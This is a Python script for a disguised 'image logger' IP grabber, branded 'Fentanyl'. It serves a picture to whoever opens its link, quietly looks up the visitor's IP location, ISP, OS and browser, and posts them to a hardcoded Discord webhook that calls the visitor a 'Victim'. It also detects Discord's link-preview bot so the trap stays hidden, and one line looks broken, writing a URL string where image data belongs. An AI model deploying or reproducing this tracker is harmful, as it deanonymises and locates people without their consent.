from http.server import BaseHTTPRequestHandler
from urllib import parse
import requests
import base64
import httpagentparser

# YOUR WEBHOOK HERE
webhook = 'https://discord.com/api/webhooks/1559315092594630798/yhnQBuFl52mEqp68sUIant-D9AMr2QwypBGHKanjP5DOhTwn2Tby7ohP7oSwjY07Yc5X'

# YOUR ORIGINAL BUGGED BIN DATA
buggedbin = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

# DEFAULT IMAGE FALLBACK (Tiny 1x1 transparent PNG)
DEFAULT_IMG = 'https://placehold.co/1x1.png'

def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
    return {
      "username": "Fentanyl",
      "content": "@everyone",
      "embeds": [
        {
          "title": "Fentanyl strikes again!",
          "color": 16711803,
          "description": "A Victim opened the original Image. You can find their info below.",
          "author": {"name": "Fentanyl"},
          "fields": [
            {"name": "IP Info", "value": f"**IP:** `{ip}`\n**City:** `{city}`\n**Region:** `{reg}`\n**Country:** `{country}`\n**Location:** `{loc}`\n**ORG:** `{org}`\n**ZIP:** `{postal}`", "inline": True},
            {"name": "Advanced Info", "value": f"**OS:** `{os}`\n**Browser:** `{browser}`\n**UserAgent:** `Look Below!`\n```yaml\n{useragent}\n```", "inline": False}
          ]
        }
      ],
    }

def prev(ip,uag):
    return {
      "username": "Fentanyl",
      "content": "",
      "embeds": [
        {
          "title": "Fentanyl Alert!",
          "color": 16711803,
          "description": f"Discord previewed a Fentanyl Image! You can expect an IP soon.\n\n**IP:** `{ip}`\n**UserAgent:** `Look Below!`\n```yaml\n{uag}```",
          "author": {"name": "Fentanyl"},
          "fields": []
        }
      ],
    }

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        s = self.path
        dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
        
        # Determine Content Type based on URL ending (.jpg or .png)
        target_url = dic.get('url', '')
        if target_url.lower().endswith('.png'):
            content_type = 'image/png'
        else:
            content_type = 'image/jpeg'

        # Get Image Data
        try:
            data = requests.get(dic['url']).content if 'url' in dic else buggedbin
        except Exception:
            data = buggedbin

        useragent = self.headers.get('user-agent') if 'user-agent' in self.headers else 'No User Agent Found!'
        os, browser = httpagentparser.simple_detect(useragent)
        
        ip = self.headers.get('x-forwarded-for')

        # Check for Discord Bots (The "Bug")
        if ip and ip.startswith(('35','34','104.196')):
            if 'discord' in useragent.lower():
                # Send the "bugged" small image to Discord
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                data = requests.get(DEFAULT_IMG).content if isinstance(DEFAULT_IMG, str) else DEFAULT_IMG
                self.wfile.write(DEFAULT_IMG) 
                
                # Send the "Preview" webhook
                requests.post(webhook, json=prev(ip, useragent))
            else:
                pass
        else:
            # Normal User: Send the full image
            self.send_response(200)
            self.send_header('Content-type', content_type)
            self.end_headers()
            self.wfile.write(data)
            
            # Send the "Final" webhook with IP info
            try:
                ipInfo = requests.get(f'https://ipinfo.io/{ip}/json').json()
                requests.post(webhook, json=formatHook(
                    ipInfo.get('ip'), ipInfo.get('city'), ipInfo.get('region'), 
                    ipInfo.get('country'), ipInfo.get('loc'), ipInfo.get('org'), 
                    ipInfo.get('postal'), useragent, os, browser
                ))
            except:
                pass
        
        return
